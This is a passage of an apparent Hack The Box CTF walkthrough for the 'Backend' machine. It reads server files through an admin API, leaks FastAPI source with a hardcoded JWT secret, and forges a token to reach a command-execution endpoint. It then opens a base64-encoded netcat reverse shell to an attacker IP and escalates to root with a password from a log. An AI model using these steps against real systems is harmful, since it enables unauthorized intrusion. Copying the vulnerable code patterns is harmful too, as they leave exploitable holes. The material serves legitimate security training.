$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyNDk2LCJpYXQiOjE2NjA5NTEyOTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.sB2pt3FubfnIdkLZ42COFa13aHDDH3xguz99WcvI8-U' http://10.129.227.148/api/v1/admin/exec/whoami
{"detail":"Debug key missing from JWT"}                                                                                                                     
```

Interact with the `/api/v1/admin/file` endpoint to read `/etc/passwd`. `htb` appears to be the only non-standard user.

```bash
$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyNDk2LCJpYXQiOjE2NjA5NTEyOTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.sB2pt3FubfnIdkLZ42COFa13aHDDH3xguz99WcvI8-U' -H 'Content-Type: application/json' -d '{"file": "/etc/passwd"}' http://10.129.227.148/api/v1/admin/file
{"file":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n"}                                                                    
```

Attempting to read `/home/htb/.ssh/id_rsa` results in an Internal Server Error, indicating the file likely doesn't exist.

It seems like `/api/v1/admin/exec` is the most viable way forward. If it is possible to leak the application's source code, it may be possible to figure out the secret the application uses to sign JWTs. With this secret, it will be possible to add a `debug` key in the valid JWT's payload and leverage the tampered JWT to interact with the `/api/v1/admin/exec` endpoint.

Interact with `/api/v1/admin/file` to read `/proc/self/environ`.

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"file": "/proc/self/environ"}' http://10.129.227.148/api/v1/admin/file | jq
{
  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=f2e02210bb2e4d13b8de84545879cfd8\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:19013\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"
}
```

The application is structured like a typical [FastAPI](https://fastapi.tiangolo.com/) project in `/home/htb/app/`. Interact with the `/api/v1/admin/file` endpoint to read the API source code in this directory.

According to the import section of `app/main.py`, the program's entrypoint, the API's router is defined in `app/api/v1/api.py`. It has configuration settings defined in `app/core/config.py`. It has FastAPI dependencies stored in `app/deps.py`.

`app/main.py`:

```python
import asyncio

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi



from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session



from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings

from app import deps
from app import crud


app = FastAPI(title=\"UHC API Quals\", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)


@app.get(\"/\", status_code=200)
def root():
    \"\"\"
    Root GET
    \"\"\"
    return {\"msg\": \"UHC API Version 1.0\"}


@app.get(\"/api\", status_code=200)
def list_versions():
    \"\"\"
    Versions
    \"\"\"
    return {\"endpoints\":[\"v1\"]}


@app.get(\"/api/v1\", status_code=200)
def list_endpoints_v1():
    \"\"\"
    Version 1 Endpoints
    \"\"\"
    return {\"endpoints\":[\"user\", \"admin\"]}


@app.get(\"/docs\")
async def get_documentation(
    current_user: User = Depends(deps.parse_token)
    ):
    return get_swagger_ui_html(openapi_url=\"/openapi.json\", title=\"docs\")

@app.get(\"/openapi.json\")
async def openapi(
    current_user: User = Depends(deps.parse_token)
):
    return get_openapi(title = \"FastAPI\", version=\"0.1.0\", routes=app.routes)

app.include_router(api_router, prefix=settings.API_V1_STR)
app.include_router(root_router)

def start():
    import uvicorn

    uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")

if __name__ == \"__main__\":
    # Use this for debugging purposes only
    import uvicorn

    uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")
```

`app/api/v1/api.py`:

```python
from fastapi import APIRouter
from app.api.v1.endpoints import user, admin


api_router = APIRouter()
api_router.include_router(user.router, prefix=\"/user\", tags=[\"user\"])
api_router.include_router(admin.router, prefix=\"/admin\", tags=[\"admin\"])
```

`app/api/v1/endpoints/admin.py`:

```python
import asyncio

from fastapi import APIRouter, Depends, HTTPException, Query, Request
from sqlalchemy.orm import Session
from typing import Any, Optional

from app import crud
from app.api import deps

from app import schemas

from app.schemas.admin import GetFile
from app.schemas.user import User


router = APIRouter()


@router.get(\"/\", status_code=200)
def admin_check(
    *,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> dict:
    \"\"\"
    Returns true if the user is admin
    \"\"\"
    if current_user[is_superuser]:
        return {\"results\": True }

    return {\"results\": False }


@router.post(\"/file\", status_code=200)
def get_file(
    file_in: GetFile,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> str:
    \"\"\"
    Returns a file on the server
    \"\"\"
    if not current_user[is_superuser]:
        return {\"msg\": \"Permission Error\"}

    with open(file_in.file) as f:
        output = f.read()
        return {\"file\": output}


@router.get(\"/exec/{command}\", status_code=200)
def run_command(
    command: str,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> str:
    \"\"\"
    Executes a command. Requires Debug Permissions.
    \"\"\"
    if \"debug\" not in current_user.keys():
        raise HTTPException(status_code=400, detail=\"Debug key missing from JWT\")

    import subprocess

    return subprocess.run([\"/bin/sh\",\"-c\",command], stdout=subprocess.PIPE).stdout.strip()
```

`app/deps.py`:

```python
from typing import Generator, Optional

from fastapi import Depends, HTTPException, status
from jose import jwt, JWTError
from pydantic import BaseModel
from sqlalchemy.orm.session import Session

from app.core.auth import oauth2_scheme
from app.core.config import settings
from app.db.session import SessionLocal
from app.models.user import User

class TokenData(BaseModel):
    username: Optional[str] = None

def get_db() -> Generator:
    db = SessionLocal()
    db.current_user_id = None
    try:
        yield db
    finally:
        db.close()


async def get_current_user(
    db: Session = Depends(get_db), token: str = Depends(oauth2_scheme)
) -> User:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail=\"Could not validate credentials\",
        headers={\"WWW-Authenticate\": \"Bearer\"},
    )
    try:
        payload = jwt.decode(
            token,
            settings.JWT_SECRET,
            algorithms=[settings.ALGORITHM],
            options={\"verify_aud\": False},
        )
        username: str = payload.get(\"sub\")
        if username is None:
            raise credentials_exception
        token_data = TokenData(username=username)
    except JWTError:
        raise credentials_exception

    user = db.query(User).filter(User.id == token_data.username).first()
    if user is None:
        raise credentials_exception
    return user

async def parse_token(
    token: str = Depends(oauth2_scheme)
) -> User:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail=\"Could not validate credentials\",
        headers={\"WWW-Authenticate\": \"Bearer\"},
    )
    try:
        payload = jwt.decode(
            token,
            settings.JWT_SECRET,
            algorithms=[settings.ALGORITHM],
            options={\"verify_aud\": False},
        )

    except JWTError:
        raise credentials_exception

    return payload
```

`app/core/config.py`:

```python
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = \"/api/v1\"
    JWT_SECRET: str = \"SuperSecretSigningKey-HTB\"
    ALGORITHM: str = \"HS256\"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: [\"http://localhost\", \"http://localhost:4200\", \"http://localhost:3000\", \
    # \"http://localhost:8080\", \"http://local.dockertoolbox.tiangolo.com\"]
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator(\"BACKEND_CORS_ORIGINS\", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith(\"[\"):
            return [i.strip() for i in v.split(\",\")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = \"sqlite:///uhc.db\"
    FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\"

    class Config:
        case_sensitive = True


settings = Settings()
```

The `/api/v1/admin/exec/{command}` endpoint first ensures the client's JWT is valid. Then it ensures the JWT's payload has a `debug` key. If so, it executes the command. `app/core/config.py` reveals the application's JWT secret: `SuperSecretSigningKey-HTB`. Use this secret to add a `debug` key into a valid JWT's payload.

```bash
$ python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyNDk2LCJpYXQiOjE2NjA5NTEyOTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.sB2pt3FubfnIdkLZ42COFa13aHDDH3xguz99WcvI8-U' -T --sign hs256 -p 'SuperSecretSigningKey-HTB'

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.5                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] type = "access_token"
[2] exp = 1661642496    ==> TIMESTAMP = 2022-08-27 19:21:36 (UTC)
[3] iat = 1660951296    ==> TIMESTAMP = 2022-08-19 19:21:36 (UTC)
[4] sub = "1"
[5] is_superuser = True
[6] guid = "36c2e94a-4271-4259-93bf-c96ad5948284"
[7] *ADD A VALUE*
[8] *DELETE A VALUE*
[9] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 7
Please enter new Key and hit ENTER
> debug
Please enter new value for debug and hit ENTER
> true
[1] type = "access_token"
[2] exp = 1661642496    ==> TIMESTAMP = 2022-08-27 19:21:36 (UTC)
[3] iat = 1660951296    ==> TIMESTAMP = 2022-08-19 19:21:36 (UTC)
[4] sub = "1"
[5] is_superuser = True
[6] guid = "36c2e94a-4271-4259-93bf-c96ad5948284"
[7] debug = True
[8] *ADD A VALUE*
[9] *DELETE A VALUE*
[10] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_1d910fb9ebf4cd08eb466937be859c7e - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyNDk2LCJpYXQiOjE2NjA5NTEyOTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.lcMqCdZJxGn9C7XvfVfSqSQAN5BUvtcfuQGfA7Ro9jE
```

Execute commands as `htb`.

```bash
$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyNDk2LCJpYXQiOjE2NjA5NTEyOTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.lcMqCdZJxGn9C7XvfVfSqSQAN5BUvtcfuQGfA7Ro9jE' http://10.129.227.148/api/v1/admin/exec/id
"uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)"
```

Generate a reverse shell command. Since it will be in the URI path, base64 encode it. Execute the command.

```http
GET /api/v1/admin/exec/echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNDMgOTAwMCA+L3RtcC9m|base64%20-d|sh HTTP/1.1
Host: 10.129.227.148
User-Agent: curl/7.74.0
Accept: */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNDcwMzgzLCJpYXQiOjE2NjA3NzkxODMsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.wI1eqjLBOgBjSlk54vG2YyYTpKwj8HdQEbZ8nqBNHhg
Connection: close
```

Catch the reverse shell.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.227.148] 55800
bash: cannot set terminal process group (673): Inappropriate ioctl for device
bash: no job control in this shell
htb@Backend:~/uhc$ id
id
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

---

## Privilege Escalation

Analyzing the API source code directory at `/home/htb/app/`, `auth.log` seems interesting. It logs the username for each login success and failure. It appears one user accidentally entered their password in as their username: `Tr0ub4dor&3`.

```bash
htb@Backend:~/uhc$ cat auth.log
08/19/2022, 21:48:29 - Login Success for admin@htb.local
08/19/2022, 21:51:49 - Login Success for admin@htb.local
08/19/2022, 22:05:09 - Login Success for admin@htb.local
08/19/2022, 22:08:29 - Login Success for admin@htb.local
08/19/2022, 22:13:29 - Login Success for admin@htb.local
08/19/2022, 22:16:49 - Login Success for admin@htb.local
08/19/2022, 22:30:09 - Login Success for admin@htb.local
08/19/2022, 22:38:29 - Login Success for admin@htb.local
08/19/2022, 22:40:09 - Login Success for admin@htb.local
08/19/2022, 22:46:49 - Login Success for admin@htb.local
08/19/2022, 22:55:09 - Login Failure for Tr0ub4dor&3
08/19/2022, 22:56:44 - Login Success for admin@htb.local
08/19/2022, 22:56:49 - Login Success for admin@htb.local
08/19/2022, 22:57:09 - Login Success for admin@htb.local
08/19/2022, 22:58:29 - Login Success for admin@htb.local
08/19/2022, 23:03:29 - Login Success for admin@htb.local
08/19/2022, 23:10:09 - Login Success for admin@htb.local
08/19/2022, 23:17:22 - Login Success for tgihf@htb.local
08/19/2022, 23:18:34 - Login Success for tgihf@htb.local
08/19/2022, 23:21:36 - Login Success for admin@htb.local
```

Leverage this password to elevate to `root` and grab the root flag.

```bash
htb@Backend:~/uhc$ su root
Password:
root@Backend:/home/htb/uhc# ls /root/root.txt
/root/root.txt
root@Backend:/home/htb/uhc# id
uid=0(root) gid=0(root) groups=0(root)
root@Backend:/home/htb/uhc# ls -la /root/root.txt
-rw-r--r-- 1 root root 33 Aug 19 23:12 /root/root.txt
```
